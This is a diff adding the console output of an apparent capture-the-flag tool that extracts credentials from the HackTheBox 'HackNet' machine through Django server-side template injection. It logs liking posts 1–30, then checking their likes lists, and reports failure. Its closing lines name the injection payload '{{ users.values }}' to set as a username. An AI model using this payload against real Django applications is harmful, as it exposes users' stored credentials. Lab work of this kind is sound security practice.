@@ -1,0 +1,76 @@
+[95m[1m
+============================================================
+  Django SSTI Credential Extraction Tool
+  Target: HackNet HTB
+============================================================
+[0m
+[94m[*] Starting credential extraction...[0m
+[94m[*] Testing posts 1 to 30[0m
+
+[93m[*] Step 1: Liking posts to trigger SSTI...[0m
+  [✓] Liked post 1
+  [✓] Liked post 2
+  [✓] Liked post 3
+  [✓] Liked post 4
+  [✓] Liked post 5
+  [✓] Liked post 6
+  [✓] Liked post 7
+  [✓] Liked post 8
+  [✓] Liked post 9
+  [✓] Liked post 10
+  [✓] Liked post 11
+  [✓] Liked post 12
+  [✓] Liked post 13
+  [✓] Liked post 14
+  [✓] Liked post 15
+  [✓] Liked post 16
+  [✓] Liked post 17
+  [✓] Liked post 18
+  [✓] Liked post 19
+  [✓] Liked post 20
+  [✓] Liked post 21
+  [✓] Liked post 22
+  [✓] Liked post 23
+  [✓] Liked post 24
+  [✓] Liked post 25
+  [✓] Liked post 26
+  [✗] Failed to like post 27
+  [✓] Liked post 28
+  [✗] Failed to like post 29
+  [✗] Failed to like post 30
+
+[93m[*] Step 2: Extracting credentials from likes lists...[0m
+  [*] Checking post 1... No credentials
+  [*] Checking post 2... No credentials
+  [*] Checking post 3... No credentials
+  [*] Checking post 4... No credentials
+  [*] Checking post 5... No credentials
+  [*] Checking post 6... No credentials
+  [*] Checking post 7... No credentials
+  [*] Checking post 8... No credentials
+  [*] Checking post 9... No credentials
+  [*] Checking post 10... No credentials
+  [*] Checking post 11... No credentials
+  [*] Checking post 12... No credentials
+  [*] Checking post 13... No credentials
+  [*] Checking post 14... No credentials
+  [*] Checking post 15... No credentials
+  [*] Checking post 16... No credentials
+  [*] Checking post 17... No credentials
+  [*] Checking post 18... No credentials
+  [*] Checking post 19... [91mFailed[0m
+  [*] Checking post 20... [91mFailed[0m
+  [*] Checking post 21... No credentials
+  [*] Checking post 22... No credentials
+  [*] Checking post 23... No credentials
+  [*] Checking post 24... No credentials
+  [*] Checking post 25... No credentials
+  [*] Checking post 26... No credentials
+  [*] Checking post 27... [91mFailed[0m
+  [*] Checking post 28... [91mFailed[0m
+  [*] Checking post 29... [91mFailed[0m
+  [*] Checking post 30... [91mFailed[0m
+
+[91m[!] No credentials were extracted.[0m
+[93m[!] Make sure your username is set to: {{ users.values }}[0m
+[93m[!] And that you're properly authenticated.[0m
